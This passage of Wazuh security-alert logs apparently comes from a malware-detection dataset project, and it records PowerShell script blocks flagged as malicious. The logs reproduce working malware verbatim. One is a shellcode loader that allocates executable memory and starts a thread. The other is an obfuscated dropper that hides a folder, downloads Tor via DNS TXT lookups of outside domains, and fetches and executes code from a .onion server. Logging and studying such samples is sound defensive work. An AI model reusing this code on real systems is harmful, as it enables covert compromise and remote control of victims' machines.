x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x54,0x0b,0x20,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8wer=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8wer.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8wer,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"47410cef-2361-4b43-acff-196f770ad65f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1602.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:44.760+0000","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":3,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304324.2175708","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:04.4828011Z","eventRecordID":"144926","processID":"8572","threadID":"1748","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex \"nslookup -querytype=txt $ohd 8.8.8.8\") -match '\"') -replace '\"', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = \"Hidden\", \"System\", \"NotContentIndexed\";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar \" --Log `\"notice file $cvdz`\"\" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a \"socksParentProxy=localhost:9050\" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(\"localhost:8123\");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';\r\n\r\nScriptBlock ID: 307dc05f-8fa2-4183-93c0-af30a17185d5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1604.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\\\\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex \\\"nslookup -querytype=txt $ohd 8.8.8.8\\\") -match '\\\"') -replace '\\\"', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\\\\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = \\\"Hidden\\\", \\\"System\\\", \\\"NotContentIndexed\\\";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\\\\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\\\\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\\\\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\\\\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar \\\" --Log `\\\"notice file $cvdz`\\\"\\\" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a \\\"socksParentProxy=localhost:9050\\\" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(\\\"localhost:8123\\\");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&amp;mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&amp;uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';","scriptBlockId":"307dc05f-8fa2-4183-93c0-af30a17185d5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1604.ps1"}}},"location":"EventChannel"}
